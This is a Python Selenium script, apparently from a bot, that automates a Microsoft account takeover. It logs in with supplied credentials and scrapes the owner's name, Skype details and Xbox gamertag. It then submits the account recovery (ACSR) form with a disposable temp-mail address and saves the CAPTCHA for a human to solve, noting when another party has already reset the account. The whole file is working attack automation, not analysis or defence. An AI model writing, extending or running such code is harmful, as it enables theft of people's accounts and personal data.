from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import TimeoutException
from automation.driver import create_driver
from automation.captcha import download_captcha
from automation.proxymanager import get_proxy_manager
from tempmail import generate_temp_mail_account
import time
import os


def perform_glink(email: str, password: str, user_id: int) -> dict:
    """
    Full gLink flow: login → scrape → ACSR → CAPTCHA → wait for user input.
    Returns dict with status, driver, token, account_info, captcha_file, etc.
    """
    driver = create_driver()
    wait = WebDriverWait(driver, 20)

    try:
        # ══════ LOGIN ══════
        driver.get("https://login.live.com")
        email_input = wait.until(EC.presence_of_element_located((By.ID, "usernameEntry")))
        email_input.send_keys(email)
        email_input.send_keys(Keys.RETURN)
        time.sleep(2)

        # Handle passkey / other ways
        password_input = None
        try:
            password_input = WebDriverWait(driver, 3).until(
                EC.presence_of_element_located((By.NAME, "passwd"))
            )
        except TimeoutException:
            try:
                use_password_btn = WebDriverWait(driver, 3).until(
                    EC.element_to_be_clickable((By.XPATH, "//span[contains(text(), 'Use your password')]"))
                )
                use_password_btn.click()
                password_input = WebDriverWait(driver, 5).until(
                    EC.presence_of_element_located((By.NAME, "passwd"))
                )
            except TimeoutException:
                try:
                    other_ways_btn = WebDriverWait(driver, 3).until(
                        EC.element_to_be_clickable((By.XPATH, "//span[contains(text(), 'Other ways to sign in')]"))
                    )
                    other_ways_btn.click()
                    time.sleep(1)
                    use_password_btn = WebDriverWait(driver, 5).until(
                        EC.element_to_be_clickable((By.XPATH, "//span[contains(text(), 'Use your password')]"))
                    )
                    use_password_btn.click()
                    password_input = WebDriverWait(driver, 5).until(
                        EC.presence_of_element_located((By.NAME, "passwd"))
                    )
                except TimeoutException:
                    return {"status": "failed", "error": "Could not reach password input"}

        password_input.send_keys(password)
        password_input.send_keys(Keys.RETURN)
        time.sleep(3)

        # Check wrong password
        try:
            pw_error = driver.find_element(By.ID, "passwordEntry")
            if pw_error.is_displayed():
                return {"status": "failed", "error": "Incorrect password"}
        except:
            pass

        # Handle "Stay signed in?"
        try:
            stay_signed_in = WebDriverWait(driver, 5).until(
                EC.element_to_be_clickable((By.CSS_SELECTOR, 'button[data-testid="primaryButton"]'))
            )
            stay_signed_in.click()
            time.sleep(2)
        except:
            pass

        print("✅ Login successful")

        # ══════ SCRAPE PROFILE ══════
        driver.get("https://account.microsoft.com/profile")
        time.sleep(3)
        
        name = "Name not found"
        dob = "05/05/1990"
        region = "United States"
        
        try:
            WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.TAG_NAME, "main")))
            time.sleep(2)
            
            # Try to get name
            try:
                name_el = driver.find_element(By.XPATH, "//h1")
                if name_el.text.strip():
                    name = name_el.text.strip()
            except:
                pass
        except:
            pass

        # ══════ SKYPE ══════
        driver.get("https://secure.skype.com/portal/profile")
        time.sleep(3)
        
        skype_id = "live:"
        skype_email = email
        try:
            skype_id = driver.find_element(By.CLASS_NAME, "username").text.strip()
        except:
            pass
        try:
            skype_email = driver.find_element(By.ID, "email1").get_attribute("value").strip()
        except:
            pass

        # ══════ GAMERTAG ══════
        driver.get("https://www.xbox.com/en-IN/play/user")
        time.sleep(5)
        
        gamertag = "Not found"
        try:
            url = driver.current_url
            if "/play/user/" in url:
                gamertag = url.split("/play/user/")[-1].replace("%20", " ").replace("%25", "%")
        except:
            pass

        account_info = {
            "email": email,
            "password": password,
            "name": name,
            "dob": dob,
            "region": region,
            "skype_id": skype_id,
            "skype_email": skype_email,
            "gamertag": gamertag,
        }
        print(f"✅ Profile scraped: {name}")

        # ══════ ACSR FORM ══════
        tempmail, temp_pass, token = generate_temp_mail_account()
        print(f"📩 Temp mail: {tempmail}")

        driver.get("https://account.live.com/acsr")
        time.sleep(2)

        page_text = driver.page_source.lower()
        if "you reached the limit for account recovery requests" in page_text:
            print("❌ Account already reset for this account")
            driver.quit()
            return {"status": "failed", "error": "This account has already been reset by someone. Account recovery cooldown is active."}

        email_input = wait.until(EC.presence_of_element_located((By.ID, "AccountNameInput")))
        email_input.clear()
        email_input.send_keys(email)

        tempmail_input = wait.until(EC.presence_of_element_located((By.ID, "iCMailInput")))
        tempmail_input.clear()
        tempmail_input.send_keys(tempmail)

        captcha_image = download_captcha(driver)
        print("🧩 CAPTCHA downloaded")

        # ══════ SAVE CAPTCHA ══════
        captcha_filename = f"captcha_glink_{user_id}_{int(time.time())}.png"
        captcha_image.seek(0)
        with open(captcha_filename, "wb") as f:
            f.write(captcha_image.read())

        return {
            "status": "captcha_pending",
            "driver": driver,
            "token": token,
            "tempmail": tempmail,
            "account_info": account_info,
            "email": email,
            "password": password,
            "captcha_file": captcha_filename,
            "captcha_attempts": 0,
        }

    except Exception as e:
        print(f"❌ gLink error: {e}")
        try:
            driver.quit()
        except:
            pass
        return {"status": "failed", "error": str(e)}